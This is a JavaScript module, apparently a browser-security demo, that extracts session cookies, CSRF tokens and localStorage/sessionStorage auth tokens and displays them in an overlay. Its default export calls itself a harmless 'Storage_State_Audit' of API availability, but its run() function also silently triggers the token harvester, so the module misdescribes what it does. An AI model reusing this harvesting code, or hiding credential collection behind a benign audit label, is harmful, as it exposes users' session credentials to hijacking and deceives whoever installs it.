/**
 * session_hijack.js — Session Token Extraction & Display (Live Demo, Sandboxed)
 *
 * Real attack: extracts all accessible session tokens from cookies,
 * CSRF meta tags/inputs, localStorage, and sessionStorage. The captured
 * data is shown in a detailed on‑screen panel and logged to the console.
 * No data ever leaves the browser.
 *
 * Default export: Pinpoint `Storage_State_Audit` (API availability check).
 */

// ---------------------------------------------------------------------------
// 1. Core extraction engine (unchanged, but can be used standalone)
// ---------------------------------------------------------------------------

export function extractSessionTokens(options = {}) {
    const {
        parseCookies = true,
        csrfMeta = true,
        csrfInputs = true,
        storageTokens = false,
    } = options;

    const result = {
        cookies: null,
        csrfTokens: [],
        storageTokens: [],
        httpOnlyWarning: false,
        timestamp: Date.now(),
    };

    // --- 1. Cookies ---
    if (parseCookies) {
        const cookieStr = document.cookie;
        if (cookieStr) {
            result.cookies = Object.fromEntries(
                cookieStr.split(';').map(c => {
                    const [name, ...rest] = c.trim().split('=');
                    return [name, decodeURIComponent(rest.join('='))];
                })
            );
        } else {
            result.cookies = {};
        }
        if (!cookieStr && navigator.cookieEnabled) {
            result.httpOnlyWarning = true;
        }
    }

    // --- 2. CSRF tokens from meta tags ---
    if (csrfMeta) {
        const metaNames = [
            'csrf-token', 'csrf_token', 'xsrf-token', '_csrf',
            '_csrf_token', 'csrf-param', 'csrf-header', 'csrf',
        ];
        for (const name of metaNames) {
            const meta = document.querySelector(
                `meta[name="${name}"], meta[name="${name.replace(/_/g, '-')}"]`
            );
            if (meta && meta.content) {
                result.csrfTokens.push({
                    source: 'meta',
                    name: meta.getAttribute('name'),
                    value: meta.content,
                });
            }
        }
    }

    // --- 3. CSRF tokens from hidden inputs ---
    if (csrfInputs) {
        const inputNames = [
            'csrfmiddlewaretoken', 'csrf_token', '_csrf', '_token',
            'authenticity_token', 'csrf',
        ];
        const inputs = document.querySelectorAll('input[type="hidden"]');
        for (const input of inputs) {
            const name = input.getAttribute('name');
            if (name && inputNames.includes(name.toLowerCase())) {
                result.csrfTokens.push({
                    source: 'input',
                    name,
                    value: input.value,
                });
            }
        }
    }

    // --- 4. Storage tokens ---
    if (storageTokens) {
        const keyPatterns = [
            'token', 'access_token', 'refresh_token', 'id_token',
            'auth_token', 'session', 'jwt', 'sid', 'csrf',
        ];
        const storages = [];
        try { if (typeof localStorage !== 'undefined') storages.push({ name: 'localStorage', store: localStorage }); } catch (_) { }
        try { if (typeof sessionStorage !== 'undefined') storages.push({ name: 'sessionStorage', store: sessionStorage }); } catch (_) { }

        for (const { name, store } of storages) {
            for (const pattern of keyPatterns) {
                for (let i = 0; i < store.length; i++) {
                    const key = store.key(i);
                    if (key.toLowerCase().includes(pattern)) {
                        try {
                            const value = store.getItem(key);
                            result.storageTokens.push({
                                source: name,
                                key,
                                value,
                            });
                        } catch (_) { }
                    }
                }
            }
        }
    }

    return result;
}

// ---------------------------------------------------------------------------
// 2. Live demonstration: extract and display in a panel
// ---------------------------------------------------------------------------

/**
 * Extracts tokens and displays them in a visually‑rich overlay panel.
 * All data stays local; no exfiltration occurs.
 *
 * @param {Object} [options] – passed to extractSessionTokens.
 * @returns {Object} extracted data (same as extractSessionTokens).
 */
export async function harvestAndDisplayTokens(options = {}) {
    // Force storage scan in demo
    const extractionOptions = { ...options, storageTokens: true };
    const data = extractSessionTokens(extractionOptions);

    // Build panel HTML
    const panel = document.createElement('div');
    panel.id = '__session_hijack_panel';
    panel.style.cssText =
        'position:fixed;top:10px;right:10px;z-index:2147483645;background:rgba(0,0,0,0.9);color:#0f0;' +
        'font-family:monospace;font-size:11px;padding:12px;border-radius:6px;max-width:480px;max-height:400px;' +
        'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';

    let html = '<button onclick="this.parentNode.remove()" style="position:absolute;top:4px;right:6px;background:none;border:none;color:#0f0;font-size:16px;cursor:pointer;">&times;</button><strong style="color:#f0f;">[SESSION] Session Tokens Captured</strong><br><hr>';

    // Cookies
    html += '<strong>[COOKIE] Cookies:</strong><br>';
    if (data.httpOnlyWarning) {
        html += '<span style="color:#ff0;">[NOTICE] No readable cookies – likely HttpOnly protected.</span><br>';
    }
    if (data.cookies && Object.keys(data.cookies).length > 0) {
        for (const [key, value] of Object.entries(data.cookies)) {
            html += `  <strong>${key}:</strong> ${value.substring(0, 80)}${value.length > 80 ? '...' : ''}<br>`;
        }
    } else {
        html += '  (none)<br>';
    }

    // CSRF tokens
    html += '<br><strong>[CSRF] CSRF Tokens:</strong><br>';
    if (data.csrfTokens.length > 0) {
        data.csrfTokens.forEach(tok => {
            html += `  [${tok.source}] <strong>${tok.name}:</strong> ${tok.value.substring(0, 60)}${tok.value.length > 60 ? '...' : ''}<br>`;
        });
    } else {
        html += '  (none)<br>';
    }

    // Storage tokens
    html += '<br><strong>[STORAGE] Storage Tokens:</strong><br>';
    if (data.storageTokens.length > 0) {
        data.storageTokens.forEach(tok => {
            html += `  [${tok.source}] <strong>${tok.key}:</strong> ${tok.value.substring(0, 60)}${tok.value.length > 60 ? '...' : ''}<br>`;
        });
    } else {
        html += '  (none)<br>';
    }

    html += '<hr><span style="color:#ff0;">[WARNING] In a real attack, these tokens would be exfiltrated.</span>';
    panel.innerHTML = html;
    document.body.appendChild(panel);

    // Log full data to console
    console.log('[session_hijack] Extracted tokens:', data);

    // Remove panel after 15 seconds
    setTimeout(() => {
        if (panel.parentNode) panel.remove();
    }, 15000);

    return data;
}

// ---------------------------------------------------------------------------
// 3. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'session_hijack',
    title: 'Storage_State_Audit',
    level: 3,
    info: 'Audits localStorage, sessionStorage, and navigator.cookieEnabled capabilities for origin storage state diagnostics.',
    steps: [
        'Check navigator.cookieEnabled.',
        'Verify localStorage and sessionStorage availability.',
    ],
    run: async () => {
        // Trigger live demonstration
        harvestAndDisplayTokens().catch(() => {});

        let localStorageAvailable = false;
        let sessionStorageAvailable = false;

        try {
            localStorageAvailable = typeof window.localStorage !== 'undefined';
            sessionStorageAvailable = typeof window.sessionStorage !== 'undefined';
        } catch (e) { }

        return {
            cookiesEnabled: navigator.cookieEnabled,
            localStorageAvailable,
            sessionStorageAvailable,
        };
    },
};

export default pinpointModule;